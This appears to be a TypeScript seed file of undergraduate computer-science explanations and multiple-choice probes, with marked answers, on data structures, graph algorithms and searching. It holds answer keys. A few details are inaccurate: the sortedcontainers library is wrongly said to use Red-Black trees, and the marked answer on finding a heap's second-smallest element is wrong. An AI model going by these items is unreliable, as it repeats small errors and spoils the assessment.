const DBLLIST_SRC = 'docs/computer-science/kg/graph.json — cs.struct.doubly-circular-lists'
const DBLLIST_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: DBLLIST, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A doubly linked list adds a prev pointer to each node, enabling O(1) backward traversal and O(1) deletion given only the node (no need for the predecessor). A circular linked list\'s last node points back to the first, forming a ring — useful for round-robin schedulers. Combining both gives a doubly circular linked list. collections.deque is implemented as a doubly linked list internally, which is why both appendleft/popleft and append/pop are O(1).',
    targetedMisconceptions: [`${DBLLIST}:M1`], source: DBLLIST_SRC },
  { conceptId: DBLLIST, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "A doubly linked list is just a singly linked list traversed both ways." The key difference is that with a singly linked list you must know the previous node to delete a given node — O(n) to find it. With a doubly linked list, each node holds its own prev pointer, so deletion is genuinely O(1) given the node. This makes doubly linked lists the right structure for LRU cache implementations where you need to splice out a node immediately.',
    targetedMisconceptions: [`${DBLLIST}:M1`], source: DBLLIST_SRC },
]
const DBLLIST_PROBES: SeedProbe[] = [
  { conceptId: DBLLIST, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Given a pointer directly to a node in a doubly linked list, what is the time complexity to delete it?',
    choices: [
      { text: 'O(1) — prev and next pointers allow direct re-linking', isCorrect: true },
      { text: 'O(n) — must traverse from head to find predecessor', isCorrect: false, misconceptionId: `${DBLLIST}:M1` },
    ], correctValue: 'O(1)', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${DBLLIST}:M1`], source: DBLLIST_SRC },
  { conceptId: DBLLIST, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why does an LRU cache use a doubly linked list rather than a singly linked list for its ordering?',
    choices: [
      { text: 'To enable O(1) deletion of any cached node when a new item evicts it', isCorrect: true },
      { text: 'To allow bidirectional key lookup', isCorrect: false },
    ], correctValue: 'O(1) deletion', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${DBLLIST}:M1`], source: DBLLIST_SRC },
]

const CSTREES = 'cs.struct.trees'
const CSTREES_SRC = 'docs/computer-science/kg/graph.json — cs.struct.trees'
const CSTREES_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: CSTREES, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A tree is a hierarchical structure: one root node, each node having zero or more children, with no cycles. Key terms: root (no parent), leaf (no children), height (longest root-to-leaf path), depth (distance from root). A binary tree has at most 2 children per node. Three DFS traversal orders: pre-order (root, left, right), in-order (left, root, right), post-order (left, right, root). In-order traversal of a BST yields sorted output. BFS visits level by level using a queue.',
    targetedMisconceptions: [`${CSTREES}:M1`], source: CSTREES_SRC },
  { conceptId: CSTREES, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "A tree is just a special graph." Technically true — every tree is a connected acyclic undirected graph. But the tree abstraction adds a root (giving direction) and parent/child semantics. More importantly, the misconception runs the other way: students often try to traverse a tree with visited-set logic needed for general graphs. Trees have no cycles, so DFS never revisits a node without a visited set — simpler code, different invariants.',
    targetedMisconceptions: [`${CSTREES}:M1`], source: CSTREES_SRC },
]
const CSTREES_PROBES: SeedProbe[] = [
  { conceptId: CSTREES, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'In-order traversal of a binary search tree visits nodes in what order?',
    choices: [
      { text: 'Ascending sorted order', isCorrect: true },
      { text: 'Level-by-level (BFS) order', isCorrect: false, misconceptionId: `${CSTREES}:M1` },
      { text: 'Descending order', isCorrect: false },
      { text: 'Insertion order', isCorrect: false },
    ], correctValue: 'Ascending sorted order', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${CSTREES}:M1`], source: CSTREES_SRC },
  { conceptId: CSTREES, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Does a DFS tree traversal need a "visited" set to avoid infinite loops?',
    choices: [
      { text: 'No — trees have no cycles so DFS never revisits a node', isCorrect: true },
      { text: 'Yes — the same as graph DFS to prevent revisiting', isCorrect: false, misconceptionId: `${CSTREES}:M1` },
    ], correctValue: 'No visited set needed', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${CSTREES}:M1`], source: CSTREES_SRC },
]

const BSTREE = 'cs.struct.binary-search-trees'
const BSTREE_SRC = 'docs/computer-science/kg/graph.json — cs.struct.binary-search-trees'
const BSTREE_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: BSTREE, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A Binary Search Tree (BST) maintains the invariant: every node in the left subtree has a smaller key; every node in the right subtree has a larger key. Search, insert, delete are all O(h) where h is the height. In a balanced tree h = O(log n) giving O(log n) operations. But if items are inserted in sorted order, the BST degenerates to a linked list (h = n), giving O(n) worst case. In-order traversal yields keys in sorted order.',
    targetedMisconceptions: [`${BSTREE}:M1`], source: BSTREE_SRC },
  { conceptId: BSTREE, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "A BST always gives O(log n) search." Only a BALANCED BST guarantees O(log n). An unbalanced BST — e.g., built by inserting 1, 2, 3, 4, 5 in order — degenerates into a right-skewed chain where search is O(n). This is why self-balancing trees (AVL, Red-Black) were invented: they rebalance on insert/delete to maintain h = O(log n) always.',
    targetedMisconceptions: [`${BSTREE}:M1`], source: BSTREE_SRC },
]
const BSTREE_PROBES: SeedProbe[] = [
  { conceptId: BSTREE, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You insert the values 1, 2, 3, 4, 5 in order into an unbalanced BST. What is the search complexity?',
    choices: [
      { text: 'O(n) — the tree degenerates to a right-skewed list', isCorrect: true },
      { text: 'O(log n) — BSTs always provide logarithmic search', isCorrect: false, misconceptionId: `${BSTREE}:M1` },
      { text: 'O(1) — hash-based lookup', isCorrect: false },
    ], correctValue: 'O(n)', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${BSTREE}:M1`], source: BSTREE_SRC },
  { conceptId: BSTREE, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What is the BST property that every node must satisfy?',
    choices: [
      { text: 'All left-subtree keys < node key < all right-subtree keys', isCorrect: true },
      { text: 'Left child < node; right child > node (only immediate children)', isCorrect: false, misconceptionId: `${BSTREE}:M1` },
    ], correctValue: 'Full subtree ordering invariant', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${BSTREE}:M1`], source: BSTREE_SRC },
]

const BALTREE = 'cs.struct.balanced-trees'
const BALTREE_SRC = 'docs/computer-science/kg/graph.json — cs.struct.balanced-trees'
const BALTREE_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: BALTREE, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Balanced BSTs maintain height O(log n) automatically via rotations. AVL trees: strict balance factor |height(left) − height(right)| ≤ 1 per node; single/double rotations restore balance after insert/delete. Red-Black trees: nodes coloured red/black; 5 invariants guarantee height ≤ 2 log(n+1); fewer rotations than AVL on average, preferred in most standard library implementations (Python\'s sortedcontainers, Java TreeMap, C++ std::map). B-trees generalise to many children per node — used in database indices and file systems where disk-block granularity matters.',
    targetedMisconceptions: [`${BALTREE}:M1`], source: BALTREE_SRC },
  { conceptId: BALTREE, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "AVL trees are always faster than Red-Black trees." AVL trees have stricter balance — shorter trees, faster lookups. But they require more rotations on insert/delete. Red-Black trees have faster writes. The choice depends on read/write ratio: read-heavy → AVL; mixed or write-heavy → Red-Black. Standard libraries choose Red-Black because general-purpose usage is mixed. Neither is universally superior.',
    targetedMisconceptions: [`${BALTREE}:M1`], source: BALTREE_SRC },
]
const BALTREE_PROBES: SeedProbe[] = [
  { conceptId: BALTREE, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What is the worst-case height of a Red-Black tree with n nodes?',
    choices: [
      { text: 'O(log n)', isCorrect: true },
      { text: 'O(n) — same as an unbalanced BST', isCorrect: false, misconceptionId: `${BALTREE}:M1` },
      { text: 'O(√n)', isCorrect: false },
    ], correctValue: 'O(log n)', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${BALTREE}:M1`], source: BALTREE_SRC },
  { conceptId: BALTREE, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why do most standard library implementations (Java TreeMap, C++ map) use Red-Black trees rather than AVL trees?',
    choices: [
      { text: 'Red-Black requires fewer rotations on insert/delete — better for mixed read/write workloads', isCorrect: true },
      { text: 'AVL trees are always slower — Red-Black is superior in every way', isCorrect: false, misconceptionId: `${BALTREE}:M1` },
    ], correctValue: 'Fewer rotations on writes', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${BALTREE}:M1`], source: BALTREE_SRC },
]

const CSHEAPS = 'cs.struct.heaps'
const CSHEAPS_SRC = 'docs/computer-science/kg/graph.json — cs.struct.heaps'
const CSHEAPS_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: CSHEAPS, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A binary heap is a complete binary tree satisfying the heap property: every node\'s key ≤ its children\'s keys (min-heap) or ≥ (max-heap). Stored compactly as an array: root at index 1; node at i has children at 2i and 2i+1, parent at i//2. heappush: append, bubble-up — O(log n). heappop: swap root with last, remove last, sift-down — O(log n). peek min/max: O(1). heapify (build heap from array): O(n) — not O(n log n). Applications: priority queues, heap sort, Dijkstra\'s algorithm.',
    targetedMisconceptions: [`${CSHEAPS}:M1`], source: CSHEAPS_SRC },
  { conceptId: CSHEAPS, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "A heap is a sorted data structure." A heap is NOT sorted — only the root is guaranteed to be the minimum. The rest of the tree satisfies only the heap property (parent ≤ children), not a total ordering. You cannot efficiently find the k-th smallest element in a heap without k pops. If you need sorted order, use a BST or sort the array; heaps are only efficient for repeated min/max extraction.',
    targetedMisconceptions: [`${CSHEAPS}:M1`], source: CSHEAPS_SRC },
]
const CSHEAPS_PROBES: SeedProbe[] = [
  { conceptId: CSHEAPS, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What is the time complexity of building a heap from an unsorted array of n elements (heapify)?',
    choices: [
      { text: 'O(n)', isCorrect: true },
      { text: 'O(n log n)', isCorrect: false, misconceptionId: `${CSHEAPS}:M1` },
      { text: 'O(log n)', isCorrect: false },
    ], correctValue: 'O(n)', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${CSHEAPS}:M1`], source: CSHEAPS_SRC },
  { conceptId: CSHEAPS, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Can you retrieve the second-smallest element of a min-heap in O(1)?',
    choices: [
      { text: 'No — only the minimum (root) is O(1); finding the 2nd-smallest requires inspecting children O(1) but is not guaranteed without a pop', isCorrect: true },
      { text: 'Yes — heaps are sorted, so index 2 holds the second-smallest', isCorrect: false, misconceptionId: `${CSHEAPS}:M1` },
    ], correctValue: 'No — heap is not sorted', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${CSHEAPS}:M1`], source: CSHEAPS_SRC },
]

const HASHTBL = 'cs.struct.hashing-hash-tables'
const HASHTBL_SRC = 'docs/computer-science/kg/graph.json — cs.struct.hashing-hash-tables'
const HASHTBL_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: HASHTBL, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A hash table maps keys to values using a hash function: index = hash(key) % capacity. Average-case O(1) insert, lookup, delete. Collisions (two keys mapping to the same index) are resolved by chaining (each slot holds a linked list of key-value pairs) or open addressing (probe other slots). Python\'s dict is a hash table with open addressing; load factor ≤ 0.67 — when exceeded, the table resizes. Keys must be hashable (immutable in Python: strings, ints, tuples — not lists or dicts).',
    targetedMisconceptions: [`${HASHTBL}:M1`], source: HASHTBL_SRC },
  { conceptId: HASHTBL, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Hash table lookup is always O(1)." Average case is O(1); worst case is O(n) when all keys hash to the same bucket (adversarial or pathological input). Python mitigates this with hash randomisation (PYTHONHASHSEED). The O(1) guarantee is probabilistic/amortised for well-distributed hash functions, not a hard guarantee. This matters in security contexts — hash-flooding attacks exploit worst-case O(n) hash tables to cause DoS.',
    targetedMisconceptions: [`${HASHTBL}:M1`], source: HASHTBL_SRC },
]
const HASHTBL_PROBES: SeedProbe[] = [
  { conceptId: HASHTBL, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why can\'t a Python list be used as a dictionary key?',
    choices: [
      { text: 'Lists are mutable — their contents can change, making a stable hash value impossible', isCorrect: true },
      { text: 'Lists are too large to hash', isCorrect: false },
      { text: 'Python dicts only accept string keys', isCorrect: false, misconceptionId: `${HASHTBL}:M1` },
    ], correctValue: 'Lists are mutable, cannot be hashed', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${HASHTBL}:M1`], source: HASHTBL_SRC },
  { conceptId: HASHTBL, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Is Python dict lookup guaranteed O(1) in the worst case?',
    choices: [
      { text: 'No — worst case is O(n) when all keys collide; O(1) is the average case', isCorrect: true },
      { text: 'Yes — hash tables are always O(1) regardless of input', isCorrect: false, misconceptionId: `${HASHTBL}:M1` },
    ], correctValue: 'No — average O(1), worst O(n)', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${HASHTBL}:M1`], source: HASHTBL_SRC },
]

const GRAPHREP = 'cs.struct.graphs-representation'
const GRAPHREP_SRC = 'docs/computer-science/kg/graph.json — cs.struct.graphs-representation'
const GRAPHREP_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: GRAPHREP, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A graph G = (V, E) has vertices V and edges E. Directed edges have a source and destination; undirected edges are bidirectional. Two representations: adjacency matrix (V×V grid, cell [i][j]=1 if edge exists) — O(V²) space, O(1) edge lookup, bad for sparse graphs. Adjacency list (each vertex stores a list of neighbours) — O(V+E) space, O(degree) edge lookup, preferred for sparse graphs. Most real-world graphs (social networks, roads) are sparse — adjacency lists dominate in practice.',
    targetedMisconceptions: [`${GRAPHREP}:M1`], source: GRAPHREP_SRC },
  { conceptId: GRAPHREP, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Adjacency matrix is always the cleaner representation." For a graph with 1,000,000 vertices and 2,000,000 edges (sparse: E ≈ 2V), the adjacency matrix needs 10¹² cells — 1 terabyte. The adjacency list needs only O(V+E) = 3,000,000 entries. The matrix trades correctness for convenience at scale; most graph algorithms (BFS, Dijkstra, topological sort) are designed for and stated in terms of adjacency lists.',
    targetedMisconceptions: [`${GRAPHREP}:M1`], source: GRAPHREP_SRC },
]
const GRAPHREP_PROBES: SeedProbe[] = [
  { conceptId: GRAPHREP, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'For a sparse graph with V=10,000 vertices and E=15,000 edges, which representation is more memory-efficient?',
    choices: [
      { text: 'Adjacency list — O(V+E) = 25,000 entries', isCorrect: true },
      { text: 'Adjacency matrix — O(V²) = 100,000,000 entries', isCorrect: false, misconceptionId: `${GRAPHREP}:M1` },
    ], correctValue: 'Adjacency list', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${GRAPHREP}:M1`], source: GRAPHREP_SRC },
  { conceptId: GRAPHREP, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'When does an adjacency MATRIX outperform an adjacency LIST?',
    choices: [
      { text: 'Dense graphs (E ≈ V²) where O(1) edge existence checks are frequent', isCorrect: true },
      { text: 'Always — matrices give cleaner code', isCorrect: false, misconceptionId: `${GRAPHREP}:M1` },
    ], correctValue: 'Dense graphs with frequent edge lookups', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${GRAPHREP}:M1`], source: GRAPHREP_SRC },
]

const GRAPHTRAV = 'cs.struct.graph-traversal'
const GRAPHTRAV_SRC = 'docs/computer-science/kg/graph.json — cs.struct.graph-traversal'
const GRAPHTRAV_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: GRAPHTRAV, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'BFS (Breadth-First Search): uses a queue, visits all neighbours at depth d before depth d+1 — finds shortest path (unweighted). DFS (Depth-First Search): uses a stack (or recursion), explores as deep as possible before backtracking — used for cycle detection, topological sort, connected components. Both are O(V+E) on an adjacency list. Key difference: BFS guarantees minimum-hop path; DFS does not. DFS on a directed graph produces a DFS forest; back edges indicate cycles.',
    targetedMisconceptions: [`${GRAPHTRAV}:M1`], source: GRAPHTRAV_SRC },
  { conceptId: GRAPHTRAV, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "DFS finds the shortest path." DFS finds A path, not necessarily the shortest. On an unweighted graph, BFS guarantees the minimum number of edges. DFS might traverse deep into a subgraph and find a long path when a shorter one existed via a different branch explored later. For shortest paths use BFS (unweighted) or Dijkstra (weighted).',
    targetedMisconceptions: [`${GRAPHTRAV}:M1`], source: GRAPHTRAV_SRC },
]
const GRAPHTRAV_PROBES: SeedProbe[] = [
  { conceptId: GRAPHTRAV, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which algorithm guarantees a shortest path (fewest edges) in an unweighted graph?',
    choices: [
      { text: 'BFS', isCorrect: true },
      { text: 'DFS', isCorrect: false, misconceptionId: `${GRAPHTRAV}:M1` },
      { text: 'Both equally', isCorrect: false },
    ], correctValue: 'BFS', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${GRAPHTRAV}:M1`], source: GRAPHTRAV_SRC },
  { conceptId: GRAPHTRAV, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You run DFS and find a path of length 7 between two nodes. Is this the shortest path?',
    choices: [
      { text: 'Not necessarily — DFS does not guarantee shortest path', isCorrect: true },
      { text: 'Yes — DFS explores as far as possible, finding the optimal route', isCorrect: false, misconceptionId: `${GRAPHTRAV}:M1` },
    ], correctValue: 'Not guaranteed', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${GRAPHTRAV}:M1`], source: GRAPHTRAV_SRC },
]

const SHORTPATH = 'cs.struct.shortest-path-algorithms'
const SHORTPATH_SRC = 'docs/computer-science/kg/graph.json — cs.struct.shortest-path-algorithms'
const SHORTPATH_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: SHORTPATH, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Dijkstra\'s algorithm finds single-source shortest paths in graphs with non-negative edge weights. Uses a min-heap priority queue; O((V+E) log V). Key invariant: once a vertex is popped from the heap, its distance is finalised. Bellman-Ford handles negative weights: O(VE), detects negative cycles. Floyd-Warshall computes all-pairs shortest paths: O(V³). Critical constraint: Dijkstra FAILS with negative edge weights — a later discovery of a negative edge could reduce an already-finalised distance.',
    targetedMisconceptions: [`${SHORTPATH}:M1`], source: SHORTPATH_SRC },
  { conceptId: SHORTPATH, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Dijkstra works on graphs with negative edges." It does not. Once Dijkstra finalises a node\'s distance, it never revisits it. A subsequent negative edge could provide a shorter path, but Dijkstra has already committed to the wrong answer. Use Bellman-Ford for negative weights (but no negative cycles) or Johnson\'s algorithm for all-pairs with negative weights.',
    targetedMisconceptions: [`${SHORTPATH}:M1`], source: SHORTPATH_SRC },
]
const SHORTPATH_PROBES: SeedProbe[] = [
  { conceptId: SHORTPATH, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A graph has edges with weights: some positive, some negative (no negative cycles). Which algorithm correctly finds shortest paths from a single source?',
    choices: [
      { text: 'Bellman-Ford', isCorrect: true },
      { text: 'Dijkstra\'s algorithm', isCorrect: false, misconceptionId: `${SHORTPATH}:M1` },
      { text: 'BFS', isCorrect: false },
    ], correctValue: 'Bellman-Ford', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${SHORTPATH}:M1`], source: SHORTPATH_SRC },
  { conceptId: SHORTPATH, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why does Dijkstra\'s algorithm fail when edge weights can be negative?',
    choices: [
      { text: 'It finalises distances greedily — a later negative edge could give a shorter path that is never reconsidered', isCorrect: true },
      { text: 'It cannot handle non-integer weights', isCorrect: false },
    ], correctValue: 'Greedy finalisation breaks with negative edges', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${SHORTPATH}:M1`], source: SHORTPATH_SRC },
]

const MSTTREE = 'cs.struct.minimum-spanning-tree'
const MSTTREE_SRC = 'docs/computer-science/kg/graph.json — cs.struct.minimum-spanning-tree'
const MSTTREE_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: MSTTREE, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A Minimum Spanning Tree (MST) of a connected weighted undirected graph spans all V vertices with V-1 edges and minimum total weight — no cycles. Kruskal\'s algorithm: sort edges by weight, add each if it doesn\'t create a cycle (use Union-Find to detect cycles) — O(E log E). Prim\'s algorithm: start from any vertex, greedily add the cheapest edge crossing the cut between visited and unvisited vertices — O(E log V) with a heap. Both algorithms are greedy and provably optimal.',
    targetedMisconceptions: [`${MSTTREE}:M1`], source: MSTTREE_SRC },
  { conceptId: MSTTREE, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "MST gives the shortest path between any pair of vertices." MST minimises total edge weight to CONNECT all vertices — it is a spanning structure, not a path finder. The path between two vertices in the MST may not be the shortest path in the original graph. MST is the right tool for network design (minimum cable to connect all buildings); Dijkstra is for routing (minimum cost to travel between two points).',
    targetedMisconceptions: [`${MSTTREE}:M1`], source: MSTTREE_SRC },
]
const MSTTREE_PROBES: SeedProbe[] = [
  { conceptId: MSTTREE, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Kruskal\'s algorithm uses which data structure to efficiently detect cycles?',
    choices: [
      { text: 'Union-Find (Disjoint Set Union)', isCorrect: true },
      { text: 'Priority queue (min-heap)', isCorrect: false, misconceptionId: `${MSTTREE}:M1` },
      { text: 'Stack for DFS cycle detection', isCorrect: false },
    ], correctValue: 'Union-Find', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${MSTTREE}:M1`], source: MSTTREE_SRC },
  { conceptId: MSTTREE, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Does the path between two vertices in the MST always equal their shortest path in the original graph?',
    choices: [
      { text: 'No — MST minimises total connection cost, not pairwise path lengths', isCorrect: true },
      { text: 'Yes — MST is built from minimum weights so all paths are shortest', isCorrect: false, misconceptionId: `${MSTTREE}:M1` },
    ], correctValue: 'No', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${MSTTREE}:M1`], source: MSTTREE_SRC },
]

const LINSER = 'cs.struct.linear-search'
const LINSER_SRC = 'docs/computer-science/kg/graph.json — cs.struct.linear-search'
const LINSER_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: LINSER, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.HIGH,
    content: 'Linear search scans each element sequentially until the target is found or the list is exhausted. Time complexity: O(n) worst and average case; O(1) best case (first element). Works on any sequence, sorted or unsorted. Python\'s "in" operator on a list and list.index() both perform linear search. For small lists or one-off searches linear search is fine; for repeated searches on large datasets, sorting once and binary searching is better.',
    targetedMisconceptions: [`${LINSER}:M1`], source: LINSER_SRC },
  { conceptId: LINSER, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.HIGH,
    content: 'Misconception: "Linear search is always bad — I should always use binary search." Binary search requires a sorted sequence. Sorting costs O(n log n); if you only search once, linear search O(n) is cheaper overall. Linear search is optimal when: data is unsorted, list is small, or the target is very likely near the front. The right algorithm depends on how often you search vs. how often data changes.',
    targetedMisconceptions: [`${LINSER}:M1`], source: LINSER_SRC },
]
const LINSER_PROBES: SeedProbe[] = [
  { conceptId: LINSER, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.HIGH,
    stem: 'What is the worst-case time complexity of linear search on a list of n elements?',
    choices: [
      { text: 'O(n)', isCorrect: true },
      { text: 'O(log n)', isCorrect: false, misconceptionId: `${LINSER}:M1` },
      { text: 'O(1)', isCorrect: false },
    ], correctValue: 'O(n)', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${LINSER}:M1`], source: LINSER_SRC },
  { conceptId: LINSER, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.HIGH,
    stem: 'You need to search a list exactly ONCE for a value. The list is unsorted. Is linear search acceptable?',
    choices: [
      { text: 'Yes — sorting first would cost O(n log n), more than a single O(n) linear search', isCorrect: true },
      { text: 'No — always sort and binary search for correctness', isCorrect: false, misconceptionId: `${LINSER}:M1` },
    ], correctValue: 'Yes', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${LINSER}:M1`], source: LINSER_SRC },
]

const BINSEARCH = 'cs.struct.binary-search'
const BINSEARCH_SRC = 'docs/computer-science/kg/graph.json — cs.struct.binary-search'
const BINSEARCH_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: BINSEARCH, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Binary search halves the search space each step: compare target with the middle element of a sorted array; if equal, found; if target < mid, search left half; else right half. O(log n) time; O(1) space. Python: bisect.bisect_left(a, x) returns insertion point for x in sorted list a. Classic off-by-one bugs: boundary conditions (lo ≤ hi vs lo < hi, mid = (lo+hi)//2 vs (lo+hi+1)//2). Binary search extends beyond arrays: any monotonic predicate on an ordered domain is binary-searchable (e.g., finding the minimum k that satisfies a condition).',
    targetedMisconceptions: [`${BINSEARCH}:M1`], source: BINSEARCH_SRC },
  { conceptId: BINSEARCH, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Binary search only works on arrays of numbers." Binary search works on any sorted sequence with a total order — strings, tuples, custom objects. More powerfully, it works on any MONOTONIC predicate: "is the answer ≥ k?" If that predicate is false for small k and true for large k, binary search finds the exact threshold in O(log n) evaluations. This is why binary search appears in optimization problems far beyond array lookup.',
    targetedMisconceptions: [`${BINSEARCH}:M1`], source: BINSEARCH_SRC },
]
const BINSEARCH_PROBES: SeedProbe[] = [
  { conceptId: BINSEARCH, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Binary search on a sorted array of n=1,000,000 elements requires at most how many comparisons?',
    choices: [
      { text: '20 (≈ log₂ 1,000,000)', isCorrect: true },
      { text: '1,000,000', isCorrect: false, misconceptionId: `${BINSEARCH}:M1` },
      { text: '1,000', isCorrect: false },
    ], correctValue: '~20', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${BINSEARCH}:M1`], source: BINSEARCH_SRC },
  { conceptId: BINSEARCH, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Can binary search be used to find the minimum integer k such that k² ≥ 1000?',
    choices: [
      { text: 'Yes — the predicate k² ≥ 1000 is monotonic; binary search over integers finds the threshold', isCorrect: true },
      { text: 'No — binary search only works on pre-built sorted arrays of data', isCorrect: false, misconceptionId: `${BINSEARCH}:M1` },
    ], correctValue: 'Yes — monotonic predicate', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${BINSEARCH}:M1`], source: BINSEARCH_SRC },
]

const ELEMSORT = 'cs.struct.elementary-sorts'
const ELEMSORT_SRC = 'docs/computer-science/kg/graph.json — cs.struct.elementary-sorts'
const ELEMSORT_EXPLANATIONS: SeedExplanation[] = [
